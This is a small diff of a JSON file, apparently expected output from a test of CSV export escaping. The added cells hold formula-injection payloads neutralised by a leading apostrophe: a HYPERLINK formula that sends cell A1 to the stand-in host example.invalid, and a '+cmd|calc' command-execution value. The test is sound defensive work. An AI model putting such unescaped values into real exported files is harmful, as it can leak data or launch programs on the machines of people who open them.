@@ -23,7 +23,10 @@
     "included": 2,
     "D50": 20
   },
-  "csvError": "TypeError: entry.session.getHullCache is not a function",
-  "csvLabelSample": "",
-  "csvError2": "TypeError: entry.session.getHullCache is not a function"
+  "csvLabelCells": [
+    "p1,\"'=HYPERLINK(\"\"http://example.invalid/?\"\"&A1",
+    "p2,'+cmd|calc.jpg",
+    "p3,'=1+2.jpg",
+    "p4,'@SUM(1).jpg"
+  ]
 }
